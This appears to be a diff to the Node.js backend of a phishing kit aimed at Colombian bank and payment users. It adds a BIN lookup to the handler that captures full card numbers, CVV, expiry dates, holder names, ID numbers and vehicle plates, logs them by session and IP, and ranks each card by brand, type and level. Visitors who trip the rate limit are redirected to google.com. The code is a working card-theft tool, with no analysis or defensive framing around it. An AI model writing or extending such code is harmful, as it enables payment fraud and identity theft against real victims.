@@ -4,6 +4,7 @@ const fs = require('fs');
 const path = require('path');
 const jwt = require('jsonwebtoken');
 const bancos = require('./bancos');
+const { lookupBin } = require('card-bin-db');
 
 const HTTP_PORT = process.env.PORT || 3000;
 const JWT_SECRET = process.env.JWT_SECRET || 'cambiar-este-secret-urgente';
@@ -106,6 +107,30 @@ function verificarJWT(req, res) {
     if (tokensInvalidos.has(token)) { json(res, 401, { ok: false, error: 'Sesión cerrada' }); return null; }
     try { return jwt.verify(token, JWT_SECRET); }
     catch (e) { json(res, 401, { ok: false, error: 'Token inválido' }); return null; }
+}
+
+/* ============================================================
+   BIN LOOKUP — Detecta tipo y nivel de tarjeta desde los primeros 6 dígitos
+   ============================================================ */
+async function obtenerInfoBin(numeroTarjeta) {
+    try {
+        const limpio = String(numeroTarjeta || '').replace(/\D/g, '');
+        if (limpio.length < 6) return null;
+        const bin = limpio.substring(0, 6);
+        const info = await lookupBin(bin);
+        if (!info) return null;
+        return {
+            bin: bin,
+            cardBrand: info.card_brand || info.scheme || 'Desconocida',
+            cardType: info.card_type || info.type || 'Desconocido',
+            cardLevel: info.card_level || info.level || info.category || 'Desconocido',
+            bankName: info.bank_name || info.issuer || 'Desconocido',
+            countryName: info.country_name || info.country || 'Desconocido'
+        };
+    } catch (e) {
+        console.error('Error en BIN lookup:', e.message);
+        return null;
+    }
 }
 
 setInterval(() => {
@@ -378,18 +403,29 @@ const server = http.createServer(async (req, res) => {
     if (req.method === 'POST' && ccMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
         try {
-            const bancoKey = 'cc-' + ccMatch[1]; // 'cc-bogota' o 'cc-bucaramanga'
+            const bancoKey = 'cc-' + ccMatch[1];
             const datos = await getBody(req);
             const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
             if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
+
+            // 🎯 NUEVO: Consultar BIN para obtener tipo y nivel de tarjeta
+            const infoBin = await obtenerInfoBin(tarjeta);
+
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, {
                 bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
                 monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
-                ip, creadoEn: new Date().toISOString()
+                ip, creadoEn: new Date().toISOString(),
+                // 🎯 NUEVO: Campos de BIN
+                bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
+                cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
+                cardType: infoBin?.cardType || 'Desconocido',
+                cardLevel: infoBin?.cardLevel || 'Desconocido',
+                bankName: infoBin?.bankName || 'Desconocido',
+                countryName: infoBin?.countryName || 'Desconocido'
             });
-            console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip}`);
-            json(res, 200, { ok: true, sessionId, bancoKey });
+            console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
+            json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
@@ -481,7 +517,6 @@ const server = http.createServer(async (req, res) => {
         const bancoKey = estadoMatch[1];
         const sessionId = estadoMatch[2];
 
-        // Validar que el banco exista en bancos PSE O sea cc-bogota / cc-bucaramanga
         const esValido = bancos[bancoKey] || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
         if (!esValido) { json(res, 404, { ok: false }); return; }
 
